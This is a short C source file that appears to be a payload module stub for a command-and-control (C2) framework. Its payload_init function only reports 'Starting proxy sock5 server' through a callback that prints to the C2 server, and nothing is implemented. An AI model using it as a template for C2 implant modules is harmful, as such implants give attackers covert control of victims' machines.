#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/utsname.h>
#include <time.h>

#include "../OutputFormatter.h" // Required!

typedef void(*output_func)(int, const char* fmt, ...); // For printing output on C2 server.

int payload_init(int id, output_func output) {

    output(id, "Starting proxy sock5 server...\n");

    return 0;
}
